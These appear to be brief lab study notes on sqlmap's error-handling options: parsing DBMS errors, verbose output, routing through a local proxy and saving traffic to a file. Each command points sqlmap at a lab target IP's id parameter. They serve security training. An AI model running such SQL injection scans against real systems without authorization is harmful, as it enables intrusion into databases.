# Handling Errors

## Parsed Messages

```shell
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' --parse-errors
```

## Verbose Output

```shell
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' -v 6
```

## Using Proxy

```shell
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' --proxy http://127.0.0.1:8080
```

## Storing the Traffic

```shell
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' -t traffic.txt
```
